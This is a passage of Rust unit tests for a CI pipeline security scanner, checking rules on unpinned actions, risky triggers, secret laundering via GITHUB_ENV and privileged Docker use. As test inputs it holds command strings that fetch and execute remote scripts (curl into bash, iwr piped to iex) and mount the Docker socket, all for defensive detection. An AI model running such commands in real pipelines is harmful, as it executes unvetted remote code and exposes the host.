    fn bash_process_substitution_curl_main_is_flagged() {
        let g = step_with_body(
            "bash <(curl -s https://raw.githubusercontent.com/some/repo/main/install.sh)",
        );
        let findings = runtime_script_fetched_from_floating_url(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn powershell_iex_remote_main_is_flagged() {
        let g = step_with_body(
            "iwr https://raw.githubusercontent.com/some/repo/main/install.ps1 | iex",
        );
        let findings = runtime_script_fetched_from_floating_url(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn docker_socket_reference_is_flagged() {
        let g = step_with_body(
            "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine docker ps",
        );
        let findings = docker_socket_exposed_to_ci_step(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0]
            .message
            .starts_with("[docker_socket_exposed_to_ci_step]"));
    }

    #[test]
    fn privileged_container_run_is_flagged() {
        let g = step_with_body("docker run --privileged alpine true");
        let findings = privileged_container_in_ci_step(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0]
            .message
            .starts_with("[privileged_container_in_ci_step]"));
    }

    #[test]
    fn known_compromised_action_ref_is_flagged() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.add_node(
            NodeKind::Image,
            "tj-actions/changed-files@v45",
            TrustZone::Untrusted,
        );
        let findings = known_compromised_action_ref(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0]
            .message
            .starts_with("[known_compromised_action_ref]"));
    }

    #[test]
    fn major_version_action_ref_gets_specific_rule_id() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.add_node(
            NodeKind::Image,
            "docker/login-action@v3",
            TrustZone::Untrusted,
        );
        let findings = action_major_version_pin_without_sha(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0]
            .message
            .starts_with("[action_major_version_pin_without_sha]"));
    }

    // ── pr_trigger_with_floating_action_ref ────────────────────

    fn graph_with_trigger_and_action(trigger: &str, action: &str) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("pr.yml"));
        g.metadata.insert(META_TRIGGER.into(), trigger.into());
        g.add_node(NodeKind::Image, action, TrustZone::ThirdParty);
        g
    }

    #[test]
    fn pull_request_target_with_floating_main_action_flagged_critical() {
        let g = graph_with_trigger_and_action("pull_request_target", "actions/checkout@main");
        let findings = pr_trigger_with_floating_action_ref(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(
            findings[0].category,
            FindingCategory::PrTriggerWithFloatingActionRef
        );
    }

    #[test]
    fn pull_request_target_with_sha_pinned_action_not_flagged() {
        let g = graph_with_trigger_and_action(
            "pull_request_target",
            "denoland/setup-deno@667a34cdef165d8d2b2e98dde39547c9daac7282",
        );
        let findings = pr_trigger_with_floating_action_ref(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn issue_comment_with_floating_action_flagged() {
        let g = graph_with_trigger_and_action("issue_comment", "foo/bar@v1");
        let findings = pr_trigger_with_floating_action_ref(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn pull_request_only_does_not_trigger_critical_compound_rule() {
        // `pull_request` (without `_target`) is the safe trigger — no base
        // repo write. Rule 4 must not fire on it.
        let g = graph_with_trigger_and_action("pull_request", "foo/bar@main");
        let findings = pr_trigger_with_floating_action_ref(&g);
        assert!(
            findings.is_empty(),
            "pull_request alone must not produce a critical compound finding"
        );
    }

    #[test]
    fn comma_separated_trigger_with_pull_request_target_flagged() {
        let g = graph_with_trigger_and_action(
            "pull_request_target,push,workflow_dispatch",
            "foo/bar@main",
        );
        let findings = pr_trigger_with_floating_action_ref(&g);
        assert_eq!(findings.len(), 1);
    }

    // ── untrusted_api_response_to_env_sink ─────────────────────

    fn graph_with_trigger_and_step_body(trigger: &str, body: &str) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("consumer.yml"));
        g.metadata.insert(META_TRIGGER.into(), trigger.into());
        let id = g.add_node(NodeKind::Step, "capture", TrustZone::FirstParty);
        if let Some(node) = g.nodes.get_mut(id) {
            node.metadata
                .insert(META_SCRIPT_BODY.into(), body.to_string());
        }
        g
    }

    #[test]
    fn workflow_run_gh_pr_view_to_github_env_flagged() {
        let body = "gh pr view --repo \"$REPO\" \"$PR_BRANCH\" --json 'number' --jq '\"PR_NUMBER=\\(.number)\"' >> $GITHUB_ENV";
        let g = graph_with_trigger_and_step_body("workflow_run", body);
        let findings = untrusted_api_response_to_env_sink(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn workflow_run_without_env_sink_not_flagged() {
        let body = "gh pr view --repo \"$REPO\" \"$PR_BRANCH\" --json number";
        let g = graph_with_trigger_and_step_body("workflow_run", body);
        let findings = untrusted_api_response_to_env_sink(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn push_trigger_writing_to_env_not_flagged() {
        // Trigger is not in scope (push isn't a cross-workflow trust boundary)
        let body = "gh pr view --json number --jq .number >> $GITHUB_ENV";
        let g = graph_with_trigger_and_step_body("push", body);
        let findings = untrusted_api_response_to_env_sink(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn workflow_run_multiline_capture_then_write_flagged() {
        let body = "VAL=$(gh api repos/foo/bar/pulls/$PR --jq .head.ref)\necho \"BRANCH=$VAL\" >> $GITHUB_ENV";
        let g = graph_with_trigger_and_step_body("workflow_run", body);
        let findings = untrusted_api_response_to_env_sink(&g);
        assert_eq!(findings.len(), 1);
    }

    // ── pr_build_pushes_image_with_floating_credentials ────────

    fn graph_pr_with_login_action(trigger: &str, action: &str) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("pr-build.yml"));
        g.metadata.insert(META_TRIGGER.into(), trigger.into());
        g.add_node(NodeKind::Image, action, TrustZone::ThirdParty);
        g
    }

    #[test]
    fn pr_with_floating_login_to_gar_flagged() {
        let g = graph_pr_with_login_action(
            "pull_request",
            "grafana/shared-workflows/actions/login-to-gar@main",
        );
        let findings = pr_build_pushes_image_with_floating_credentials(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(
            findings[0].category,
            FindingCategory::PrBuildPushesImageWithFloatingCredentials
        );
    }

    #[test]
    fn pr_with_floating_docker_login_action_flagged() {
        let g = graph_pr_with_login_action("pull_request", "docker/login-action@v3");
        let findings = pr_build_pushes_image_with_floating_credentials(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn pr_with_sha_pinned_docker_login_not_flagged() {
        let g = graph_pr_with_login_action(
            "pull_request",
            "docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046d",
        );
        let findings = pr_build_pushes_image_with_floating_credentials(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn push_trigger_with_floating_login_action_not_flagged() {
        // Outside PR context — different rule (unpinned_action) covers it.
        let g = graph_pr_with_login_action("push", "docker/login-action@v3");
        let findings = pr_build_pushes_image_with_floating_credentials(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn pr_with_unrelated_unpinned_action_not_flagged() {
        // Rule scopes itself to registry-login actions only; generic actions
        // are covered by `unpinned_action` and `pr_trigger_with_floating_action_ref`.
        let g = graph_pr_with_login_action("pull_request", "actions/checkout@v4");
        let findings = pr_build_pushes_image_with_floating_credentials(&g);
        assert!(findings.is_empty());
    }

    // ── unpinned_action severity tiering ─────────────────────────

    #[test]
    fn unpinned_action_well_known_first_party_is_medium() {
        // `actions/checkout@v4` — owner is the GitHub-maintained `actions`
        // org. The supply-chain surface is real but operationally narrow,
        // so the rule emits Medium rather than the default High.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.add_node(NodeKind::Image, "actions/checkout@v4", TrustZone::Untrusted);

        let findings = unpinned_action(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(findings[0].category, FindingCategory::UnpinnedAction);
    }

    #[test]
    fn unpinned_action_same_repo_composite_is_info() {
        // `./.github/actions/setup` — same-repo composite action. No
        // external supply-chain surface, so the rule emits Info as a
        // hygiene-only signal rather than a security finding.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.add_node(
            NodeKind::Image,
            "./.github/actions/setup",
            TrustZone::FirstParty,
        );

        let findings = unpinned_action(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Info);
        assert_eq!(findings[0].category, FindingCategory::UnpinnedAction);
    }

    #[test]
    fn unpinned_action_unknown_owner_is_high() {
        // `random-org/foo@v1` — unknown owner, full unbounded supply-chain
        // surface. This is the case the rule was originally designed for
        // and the only severity tier that still emits at High.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.add_node(NodeKind::Image, "random-org/foo@v1", TrustZone::Untrusted);

        let findings = unpinned_action(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(findings[0].category, FindingCategory::UnpinnedAction);
    }

    #[test]
    fn unpinned_action_self_hosted_runner_label_not_flagged() {
        // Self-hosted runner labels are FirstParty Image nodes too — but
        // they aren't action references and have no @version to pin. The
        // rule must skip them (META_SELF_HOSTED is the marker).
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_SELF_HOSTED.into(), "true".into());
        g.add_node_with_metadata(NodeKind::Image, "self-hosted", TrustZone::FirstParty, meta);

        let findings = unpinned_action(&g);
        assert!(
            findings.is_empty(),
            "self-hosted runner labels must not be flagged as unpinned actions: {findings:#?}"
        );
    }

    // ── authority_propagation clustering ─────────────────────────

    #[test]
    fn authority_propagation_clusters_one_secret_to_three_sinks() {
        // One secret, three different untrusted sinks reached via separate
        // propagation paths. After clustering, the rule must emit ONE
        // finding listing all three sinks in `nodes_involved`.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let secret = g.add_node(NodeKind::Secret, "GITHUB_TOKEN", TrustZone::FirstParty);
        let trampoline = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        let sink_a = g.add_node(NodeKind::Step, "deploy[0]", TrustZone::Untrusted);
        let sink_b = g.add_node(NodeKind::Step, "deploy[1]", TrustZone::Untrusted);
        let sink_c = g.add_node(NodeKind::Step, "deploy[2]", TrustZone::Untrusted);
        g.add_edge(trampoline, secret, EdgeKind::HasAccessTo);
        g.add_edge(trampoline, sink_a, EdgeKind::DelegatesTo);
        g.add_edge(trampoline, sink_b, EdgeKind::DelegatesTo);
        g.add_edge(trampoline, sink_c, EdgeKind::DelegatesTo);

        let findings = authority_propagation(&g, 4);
        assert_eq!(
            findings.len(),
            1,
            "three propagation paths from one secret must collapse to one finding, got: {findings:#?}"
        );
        let f = &findings[0];
        assert_eq!(f.category, FindingCategory::AuthorityPropagation);
        assert_eq!(f.severity, Severity::Critical);
        // [source, sink_a, sink_b, sink_c] — order preserved by insertion.
        assert_eq!(f.nodes_involved.len(), 4);
        assert_eq!(f.nodes_involved[0], secret);
        assert!(f.nodes_involved.contains(&sink_a));
        assert!(f.nodes_involved.contains(&sink_b));
        assert!(f.nodes_involved.contains(&sink_c));
        assert!(
            f.message.contains("3 sinks")
                || f.message.contains("deploy[0]") && f.message.contains("deploy[2]"),
            "cluster message must mention the multiple sinks: {}",
            f.message
        );
    }

    #[test]
    fn authority_propagation_does_not_cluster_separate_secrets() {
        // Three independent secrets, each reaching one sink. The clustering
        // is keyed on the source node, so each secret's path becomes its own
        // finding — three findings total, not one.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let s1 = g.add_node(NodeKind::Secret, "TOKEN_A", TrustZone::FirstParty);
        let s2 = g.add_node(NodeKind::Secret, "TOKEN_B", TrustZone::FirstParty);
        let s3 = g.add_node(NodeKind::Secret, "TOKEN_C", TrustZone::FirstParty);
        let step1 = g.add_node(NodeKind::Step, "step_a", TrustZone::FirstParty);
        let step2 = g.add_node(NodeKind::Step, "step_b", TrustZone::FirstParty);
        let step3 = g.add_node(NodeKind::Step, "step_c", TrustZone::FirstParty);
        let sink1 = g.add_node(NodeKind::Step, "sink_a", TrustZone::Untrusted);
        let sink2 = g.add_node(NodeKind::Step, "sink_b", TrustZone::Untrusted);
        let sink3 = g.add_node(NodeKind::Step, "sink_c", TrustZone::Untrusted);
        g.add_edge(step1, s1, EdgeKind::HasAccessTo);
        g.add_edge(step1, sink1, EdgeKind::DelegatesTo);
        g.add_edge(step2, s2, EdgeKind::HasAccessTo);
        g.add_edge(step2, sink2, EdgeKind::DelegatesTo);
        g.add_edge(step3, s3, EdgeKind::HasAccessTo);
        g.add_edge(step3, sink3, EdgeKind::DelegatesTo);

        let findings = authority_propagation(&g, 4);
        assert_eq!(
            findings.len(),
            3,
            "one finding per distinct source secret, got: {findings:#?}"
        );
        let sources: std::collections::HashSet<_> =
            findings.iter().map(|f| f.nodes_involved[0]).collect();
        assert!(sources.contains(&s1));
        assert!(sources.contains(&s2));
        assert!(sources.contains(&s3));
    }

    // ── secret_via_env_gate_to_untrusted_consumer ──────────────────────

    /// Build a graph with one job containing a configurable sequence of
    /// steps. Each tuple is (name, trust_zone, writes_env_gate, reads_env,
    /// secret_to_link). Returns the graph plus the assigned NodeIds in
    /// declaration order so tests can assert on specific nodes.
    fn job_with_steps(
        job: &str,
        steps: &[(&str, TrustZone, bool, bool, Option<&str>)],
    ) -> (AuthorityGraph, Vec<NodeId>) {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut secret_ids: std::collections::HashMap<String, NodeId> =
            std::collections::HashMap::new();
        let mut step_ids = Vec::new();
        for (name, zone, writes, reads, secret) in steps {
            let mut meta = std::collections::HashMap::new();
            meta.insert(META_JOB_NAME.into(), job.into());
            if *writes {
                meta.insert(META_WRITES_ENV_GATE.into(), "true".into());
            }
            if *reads {
                meta.insert(META_READS_ENV.into(), "true".into());
            }
            let id = g.add_node_with_metadata(NodeKind::Step, *name, *zone, meta);
            if let Some(sname) = secret {
                let secret_id = *secret_ids
                    .entry((*sname).to_string())
                    .or_insert_with(|| g.add_node(NodeKind::Secret, *sname, TrustZone::FirstParty));
                g.add_edge(id, secret_id, EdgeKind::HasAccessTo);
            }
            step_ids.push(id);
        }
        (g, step_ids)
    }

    fn gha_helper_graph(action: &str, with_inputs: Option<&str>) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.metadata
            .insert(META_PLATFORM.into(), "github-actions".into());
        let mut writer_meta = std::collections::HashMap::new();
        writer_meta.insert(META_JOB_NAME.into(), "deploy".into());
        writer_meta.insert(
            META_SCRIPT_BODY.into(),
            "echo /tmp/fake >> $GITHUB_PATH".into(),
        );
        g.add_node_with_metadata(
            NodeKind::Step,
            "path setup",
            TrustZone::FirstParty,
            writer_meta,
        );

        let mut action_meta = std::collections::HashMap::new();
        action_meta.insert(META_JOB_NAME.into(), "deploy".into());
        action_meta.insert(META_GHA_ACTION.into(), action.into());
        if let Some(inputs) = with_inputs {
            action_meta.insert(META_GHA_WITH_INPUTS.into(), inputs.into());
        }
        let step = g.add_node_with_metadata(
            NodeKind::Step,
            "sensitive action",
            TrustZone::ThirdParty,
            action_meta,
        );
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_TOKEN", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);
        g
    }

    #[test]
    fn gha_helper_path_sensitive_argv_fires_for_azure_login() {
        let g = gha_helper_graph("azure/login", None);
        let findings = gha_helper_path_sensitive_argv(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::GhaHelperPathSensitiveArgv
        );
        assert!(findings[0].message.contains("argv"));
    }

    #[test]
    fn gha_helper_path_sensitive_stdin_fires_for_docker_login() {
        let g = gha_helper_graph("docker/login-action", None);
        let findings = gha_helper_path_sensitive_stdin(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::GhaHelperPathSensitiveStdin
        );
        assert!(findings[0].message.contains("stdin"));
    }

    #[test]
    fn gha_helper_path_sensitive_env_fires_for_npm_publish() {
        let g = gha_helper_graph("JS-DevTools/npm-publish", None);
        let findings = gha_helper_path_sensitive_env(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::GhaHelperPathSensitiveEnv
        );
    }

    #[test]
    fn gha_setup_gcloud_requires_skip_install_for_path_rule() {
        let without_skip = gha_helper_graph("google-github-actions/setup-gcloud", None);
        assert!(gha_helper_untrusted_path_resolution(&without_skip).is_empty());

        let with_skip = gha_helper_graph(
            "google-github-actions/setup-gcloud",
            Some("skip_install=true"),
        );
        assert_eq!(gha_helper_untrusted_path_resolution(&with_skip).len(), 1);
    }

    #[test]
    fn gha_post_cleanup_fires_when_later_step_writes_github_env() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.metadata
            .insert(META_PLATFORM.into(), "github-actions".into());
        let mut path_meta = std::collections::HashMap::new();
        path_meta.insert(META_JOB_NAME.into(), "deploy".into());
        path_meta.insert(
            META_SCRIPT_BODY.into(),
            "echo /tmp/bin >> $GITHUB_PATH".into(),
        );
        g.add_node_with_metadata(
            NodeKind::Step,
            "earlier path",
            TrustZone::FirstParty,
            path_meta,
        );
        let mut action_meta = std::collections::HashMap::new();
        action_meta.insert(META_JOB_NAME.into(), "deploy".into());
        action_meta.insert(META_GHA_ACTION.into(), "google-github-actions/auth".into());
        g.add_node_with_metadata(NodeKind::Step, "auth", TrustZone::ThirdParty, action_meta);
        let mut writer_meta = std::collections::HashMap::new();
        writer_meta.insert(META_JOB_NAME.into(), "deploy".into());
        writer_meta.insert(
            META_SCRIPT_BODY.into(),
            "echo GOOGLE_GHA_CREDS_PATH=/tmp/x >> $GITHUB_ENV".into(),
        );
        g.add_node_with_metadata(
            NodeKind::Step,
            "later env",
            TrustZone::FirstParty,
            writer_meta,
        );

        let findings = gha_post_ambient_env_cleanup_path(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::GhaPostAmbientEnvCleanupPath
        );
        assert!(
            gha_helper_untrusted_path_resolution(&g).is_empty(),
            "cleanup-only profiles must not be reported as PATH-resolved helpers"
        );
    }

    #[test]
    fn gha_ecr_mask_password_false_flags_secret_output() {
        let g = gha_helper_graph("aws-actions/amazon-ecr-login", Some("mask-password=false"));
        let findings = gha_secret_output_after_helper_login(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::GhaSecretOutputAfterHelperLogin
        );
    }

    #[test]
    fn gha_toolcache_action_does_not_fire_helper_path_rules() {
        let g = gha_helper_graph("goreleaser/goreleaser-action", None);
        assert!(gha_helper_untrusted_path_resolution(&g).is_empty());
        assert!(gha_helper_path_sensitive_argv(&g).is_empty());
        assert!(gha_helper_path_sensitive_stdin(&g).is_empty());
        assert!(gha_helper_path_sensitive_env(&g).is_empty());
    }

    #[test]
    fn later_secret_materialized_after_path_mutation_fires_once_for_helper_edge() {
        let g = gha_helper_graph("azure/login", None);
        let findings = later_secret_materialized_after_path_mutation(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::LaterSecretMaterializedAfterPathMutation
        );
        assert!(findings[0].message.contains("materializes authority"));
    }

    #[test]
    fn setup_node_cache_handoff_requires_cache_and_prior_path_mutation() {
        let g = gha_helper_graph("actions/setup-node", Some("cache=npm"));
        let findings = gha_setup_node_cache_helper_path_handoff(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::GhaSetupNodeCacheHelperPathHandoff
        );

        let disabled = gha_helper_graph("actions/setup-node", Some("package-manager-cache=false"));
        assert!(gha_setup_node_cache_helper_path_handoff(&disabled).is_empty());

        let implicit = gha_helper_graph("actions/setup-node", None);
        assert!(
            gha_setup_node_cache_helper_path_handoff(&implicit).is_empty(),
            "YAML alone cannot prove package-manager auto-cache metadata, so no-input setup-node must not fire"
        );
    }

    #[test]
    fn setup_python_cache_handoff_only_flags_helper_backed_cache_modes() {
        let pip = gha_helper_graph("actions/setup-python", Some("cache=pip"));
        assert_eq!(gha_setup_python_cache_helper_path_handoff(&pip).len(), 1);

        let pipenv = gha_helper_graph("actions/setup-python", Some("cache=pipenv"));
        assert!(gha_setup_python_cache_helper_path_handoff(&pipenv).is_empty());
    }

    #[test]
    fn setup_python_pip_install_flags_when_authority_in_scope() {
        let g = gha_helper_graph(
            "actions/setup-python",
            Some("pip-install=-r requirements.txt"),
        );
        let findings = gha_setup_python_pip_install_authority_env(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::GhaSetupPythonPipInstallAuthorityEnv
        );
    }

    #[test]
    fn docker_setup_qemu_flags_prior_path_plus_private_image_context() {
        let g = gha_helper_graph(
            "docker/setup-qemu-action",
            Some("image=ghcr.io/example/private-binfmt:latest"),
        );
        let findings = gha_docker_setup_qemu_privileged_docker_helper(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::GhaDockerSetupQemuPrivilegedDockerHelper
        );
    }

    #[test]
    fn installer_then_shell_helper_authority_flags_downstream_shell_use() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.metadata
            .insert(META_PLATFORM.into(), "github-actions".into());
        let mut installer_meta = std::collections::HashMap::new();
        installer_meta.insert(META_JOB_NAME.into(), "deploy".into());
        installer_meta.insert(META_GHA_ACTION.into(), "sigstore/cosign-installer".into());
        let installer = g.add_node_with_metadata(
            NodeKind::Step,
            "install cosign",
            TrustZone::ThirdParty,
            installer_meta,
        );
        let mut shell_meta = std::collections::HashMap::new();
        shell_meta.insert(META_JOB_NAME.into(), "deploy".into());
        shell_meta.insert(
            META_SCRIPT_BODY.into(),
            "cosign sign ghcr.io/acme/app".into(),
        );
        let shell = g.add_node_with_metadata(
            NodeKind::Step,
            "sign image",
            TrustZone::FirstParty,
            shell_meta,
        );
        let mut id_meta = std::collections::HashMap::new();
        id_meta.insert(META_OIDC.into(), "true".into());
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "GITHUB_OIDC_TOKEN",
            TrustZone::FirstParty,
            id_meta,
        );
        g.add_edge(shell, identity, EdgeKind::HasAccessTo);

        let findings = gha_tool_installer_then_shell_helper_authority(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].nodes_involved,
            vec![installer, shell],
            "installer and downstream shell sink should be the stable dedupe anchor"
        );
    }

    #[test]
    fn workflow_shell_authority_concentration_normalizes_multiple_sinks_to_one_finding() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.metadata
            .insert(META_PLATFORM.into(), "github-actions".into());
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_JOB_NAME.into(), "publish".into());
        meta.insert(
            META_SCRIPT_BODY.into(),
            "docker login --password-stdin\ndocker push ghcr.io/acme/app".into(),
        );
        let step =
            g.add_node_with_metadata(NodeKind::Step, "publish image", TrustZone::FirstParty, meta);
        let secret = g.add_node(NodeKind::Secret, "REGISTRY_TOKEN", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = gha_workflow_shell_authority_concentration(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("docker login"));
        assert!(findings[0].message.contains("docker push"));
    }

    #[test]
    fn env_gate_writer_then_untrusted_reader_fires() {
        let (g, _ids) = job_with_steps(
            "build",
            &[
                (
                    "setup",
                    TrustZone::FirstParty,
                    true,
                    false,
                    Some("CLOUD_KEY"),
                ),
                ("deploy", TrustZone::Untrusted, false, true, None),
            ],
        );
        let findings = secret_via_env_gate_to_untrusted_consumer(&g);
        assert_eq!(findings.len(), 1, "writer + untrusted reader must fire");
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(
            findings[0].message.contains("CLOUD_KEY"),
            "message must name the laundered secret"
        );
        assert!(
            findings[0].message.contains("deploy"),
            "message must name the consumer step"
        );
    }

    #[test]
    fn env_gate_writer_then_first_party_reader_does_not_fire() {
        // First-party consumer is the legitimate use of $GITHUB_ENV — the
        // entire point of the gate. Only flagged when the consumer's trust
        // zone is reduced.
        let (g, _) = job_with_steps(
            "build",
            &[
                (
                    "setup",
                    TrustZone::FirstParty,
                    true,
                    false,
                    Some("CLOUD_KEY"),
                ),
                ("use-it", TrustZone::FirstParty, false, true, None),
            ],
        );
        let findings = secret_via_env_gate_to_untrusted_consumer(&g);
        assert!(
            findings.is_empty(),
            "first-party reader is the intended use; must not fire"
        );
    }

    #[test]
    fn env_gate_write_of_non_secret_value_does_not_fire() {
        // Writer step doesn't hold any Secret/Identity — it's writing a
        // benign value (build version, config flag) into the env. Out of
        // scope: the env gate isn't laundering authority across a trust
        // boundary because there's no authority to launder.
        let (g, _) = job_with_steps(
            "build",
            &[
                ("setup", TrustZone::FirstParty, true, false, None),
                ("deploy", TrustZone::Untrusted, false, true, None),
            ],
        );
        let findings = secret_via_env_gate_to_untrusted_consumer(&g);
        assert!(
            findings.is_empty(),
            "env-gate write of non-authority value must not fire"
        );
    }

    #[test]
    fn writer_in_different_job_does_not_fire() {
        // The env gate only propagates within a job — a writer in job A
        // cannot reach a consumer in job B even if both jobs run on the
        // same runner. Same-job constraint enforced via META_JOB_NAME.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let secret = g.add_node(NodeKind::Secret, "CLOUD_KEY", TrustZone::FirstParty);

        let mut writer_meta = std::collections::HashMap::new();
        writer_meta.insert(META_JOB_NAME.into(), "build".into());
        writer_meta.insert(META_WRITES_ENV_GATE.into(), "true".into());
        let writer =
            g.add_node_with_metadata(NodeKind::Step, "setup", TrustZone::FirstParty, writer_meta);
        g.add_edge(writer, secret, EdgeKind::HasAccessTo);

        let mut consumer_meta = std::collections::HashMap::new();
        consumer_meta.insert(META_JOB_NAME.into(), "deploy".into()); // DIFFERENT job
        consumer_meta.insert(META_READS_ENV.into(), "true".into());
        g.add_node_with_metadata(
            NodeKind::Step,
            "remote-deploy",
            TrustZone::Untrusted,
            consumer_meta,
        );

        let findings = secret_via_env_gate_to_untrusted_consumer(&g);
        assert!(
            findings.is_empty(),
            "cross-job writer/consumer pair must not fire — same-job constraint"
        );
    }

    #[test]
    fn writer_after_consumer_in_same_job_does_not_fire() {
        // Declaration order matters: a writer that comes AFTER the
        // consumer can't have populated the env the consumer read. Without
        // this ordering check the rule would over-fire on any same-job
        // write/read pair.
        let (g, _) = job_with_steps(
            "build",
            &[
                ("deploy", TrustZone::Untrusted, false, true, None),
                (
                    "setup",
                    TrustZone::FirstParty,
                    true,
                    false,
                    Some("CLOUD_KEY"),
                ),
            ],
        );
        let findings = secret_via_env_gate_to_untrusted_consumer(&g);
        assert!(
            findings.is_empty(),
            "writer that runs after the consumer cannot launder into it"
        );
    }

    #[test]
    fn third_party_consumer_also_fires() {
        // ThirdParty (SHA-pinned marketplace action) is still in scope —
        // the action's code is immutable but it can still receive and
        // exfiltrate the laundered secret.
        let (g, _) = job_with_steps(
            "build",
            &[
                (
                    "setup",
                    TrustZone::FirstParty,
                    true,
                    false,
                    Some("CLOUD_KEY"),
                ),
                (
                    "third-party-deploy",
                    TrustZone::ThirdParty,
                    false,
                    true,
                    None,
                ),
            ],
        );
        let findings = secret_via_env_gate_to_untrusted_consumer(&g);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn rule_appears_in_run_all_rules() {
        // run_all_rules wires every rule in the catalogue — assert the
        // new one is hooked up so it actually fires from the CLI scan path.
        let (g, _) = job_with_steps(
            "build",
            &[
                (
                    "setup",
                    TrustZone::FirstParty,
                    true,
                    false,
                    Some("CLOUD_KEY"),
                ),
                ("deploy", TrustZone::Untrusted, false, true, None),
            ],
        );
        let findings = run_all_rules(&g, 4);
        assert!(
            findings
                .iter()
                .any(|f| f.category == FindingCategory::SecretViaEnvGateToUntrustedConsumer),
            "secret_via_env_gate_to_untrusted_consumer must run via run_all_rules"
        );
    }

    // ── no_workflow_level_permissions_block ──────────────────

    fn graph_with_platform(platform: &str, file: &str) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source(file));
        g.metadata.insert(META_PLATFORM.into(), platform.into());
        g
    }

    #[test]
    fn no_workflow_perms_fires_on_gha_when_marker_present_and_no_token_identity() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/ci.yml");
        g.metadata
            .insert(META_NO_WORKFLOW_PERMISSIONS.into(), "true".into());
        // A real workflow always has at least one Step. The empty-graph
        // guard inside the rule excludes mis-classified variable-only YAML.
        g.add_node(NodeKind::Step, "build[0]", TrustZone::FirstParty);
        // No GITHUB_TOKEN identity nodes at all (parser would skip creating
        // them when there's no permissions block anywhere).

        let findings = no_workflow_level_permissions_block(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(
            findings[0].category,
            FindingCategory::NoWorkflowLevelPermissionsBlock
        );
    }

    #[test]
    fn no_workflow_perms_does_not_fire_on_empty_graph() {
        // Empty graph (variable-only YAML mis-detected as GHA, parse
        // failure, etc.) has no real authority surface — must skip.
        let mut g = graph_with_platform("github-actions", "vars.yml");
        g.metadata
            .insert(META_NO_WORKFLOW_PERMISSIONS.into(), "true".into());
        assert!(no_workflow_level_permissions_block(&g).is_empty());
    }

    #[test]
    fn oidc_identity_in_untrusted_context_flags_pr_context() {
        let mut g = graph_with_platform("bitbucket", "bitbucket-pipelines.yml");
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request".into());
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_OIDC.into(), "true".into());
        meta.insert(META_IDENTITY_SCOPE.into(), "broad".into());
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
